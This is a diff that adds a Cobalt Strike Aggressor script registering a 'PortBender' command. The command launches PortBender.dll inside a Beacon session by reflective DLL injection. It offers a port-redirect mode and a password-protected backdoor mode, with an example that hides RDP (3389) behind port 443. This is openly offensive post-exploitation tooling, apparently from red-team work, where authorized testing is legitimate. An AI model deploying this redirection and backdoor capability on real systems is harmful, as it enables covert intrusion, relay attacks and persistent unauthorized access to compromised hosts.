@@ -1,0 +1,21 @@
+#register help
+beacon_command_register("PortBender", "Port redirection utility",
+	"Redirect Usage: PortBender redirect FakeDstPort RedirectedPort\n" .
+	"Backdoor Usage: PortBender backdoor FakeDstPort RedirectedPort Password\n" .
+	"Examples:\n" .
+	"\tPortBender redirect 445 8445\n" .
+	"\tPortBender backdoor 443 3389 praetorian.antihacker");
+
+alias PortBender {
+    local('$bid' '$args');
+    $bid = $1;
+    $args = substr($0, 11);
+
+    if ($args eq "") {
+		berror($bid, "Please specify an argument string");
+		return;
+	}
+
+    blog($bid, "Launching PortBender module using reflective DLL injection\n");
+    bdllspawn($bid, script_resource("PortBender.dll"), $args, "PortBender", 5000, false);
+}
